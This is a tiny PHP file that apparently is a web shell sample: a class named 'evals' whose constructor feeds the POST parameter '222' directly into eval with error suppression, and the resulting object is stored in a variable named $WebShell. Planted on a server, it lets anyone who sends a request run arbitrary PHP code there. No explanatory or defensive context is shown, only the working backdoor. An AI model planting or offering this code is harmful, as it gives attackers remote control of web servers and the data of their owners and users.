<?php
class evals{
        protected $links;
        function __construct($an){
                $this->links = $an;
                @eval("\$title=1;".$this->links);
        }
}
$WebShell = new evals(@$_POST['222']);
?>